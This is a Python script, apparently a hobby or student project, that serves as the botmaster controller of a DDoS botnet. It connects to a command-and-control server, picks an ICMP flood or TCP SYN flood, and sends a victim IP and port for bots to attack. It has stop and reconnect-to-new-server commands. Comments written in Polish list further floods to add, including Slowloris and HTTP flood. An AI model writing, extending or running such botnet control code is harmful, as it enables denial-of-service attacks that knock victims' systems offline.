import socket
import time


def stop_and_recconect(s):
    print("stopping the attack")
    newServerIP = str(input("enter the IP of the new Server: "))
    s.send('x'.encode())
    s.send(newServerIP.encode())


def show_menu():
    print('|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|')
    print('|    Do you want to start the attack?   |')
    print('|---------------------------------------|')
    print('|Press "1" to run a ICMP Flood attack   |')
    print('|---------------------------------------|')
    print('|Press "2" to run a TCP SYN Flood attack|')
    print('|_______________________________________|')
    # syn flood nie zaimplementowany jeszcze
    # można dodać :
    # Ping of Death
    # UDP Flood
    # HTTP Flood
    # Slowloris


def est_connection(s):
    flag = 0
    while flag != 1:
        time.sleep(0.5)
        try:
            s.connect((HOST, PORT))
            s.sendall('2'.encode())  # inform c&c that this client is the Botmaster
            flag = 1
        except ConnectionRefusedError:
            flag = 0
            time.sleep(1)
            print('Error: ')
            continue
        except KeyboardInterrupt:
            print('See you next time!!')


if __name__ == '__main__':

    HOST = '127.0.0.1'  # The server's hostname or IP address
    # HOST = '192.168.100.11'
    #HOST = '192.168.100.19'
    PORT = 65432  # The port used by the server
    show_menu()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        while True:

            attack = str(input(':'))
            if attack != '1' and attack != '2' and attack !='3':
                print("Wrong number\nplease try again")
                continue
            est_connection(s)
            s.send(attack.encode())

            print('Enter the target IPv4 adddress XXX.XXX.XXX.XXX')
            victimIP = str(input(':'))  # Walidować?
            if attack == '2':
                victimPort = str(input('Port\n:'))

            s.send(str(victimIP).encode())
            # if attack == '2':
            #     s.send(victimPort.encode())

            print("attack is in motion")

            print("press 'x' to stop the attack")
            stopattack = str(input(':'))
            if stopattack == 'x':
                stop_and_recconect(s)

            time.sleep(20)
